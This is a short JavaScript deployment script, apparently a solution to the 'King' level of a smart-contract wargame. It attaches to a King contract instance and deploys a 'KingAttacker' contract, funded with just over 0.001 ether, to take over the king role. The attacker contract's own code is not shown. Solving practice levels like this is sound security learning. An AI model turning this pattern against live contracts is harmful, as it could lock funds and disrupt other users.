const {KING_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('King level');

    if (!KING_INSTANCE_ADDRESS) {
        console.log('King instance address not found');
        return;
    }

    console.log('King instance address', KING_INSTANCE_ADDRESS);
    
    const etherToSend = ethers.utils.parseEther("0.001").add(1);
    const factory = await ethers.getContractFactory("King");
    const contract = factory.attach(KING_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("KingAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address, {value: etherToSend});
    await attackerContract.deployed();

    console.log('\x1b[32m%s\x1b[0m', 'King level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
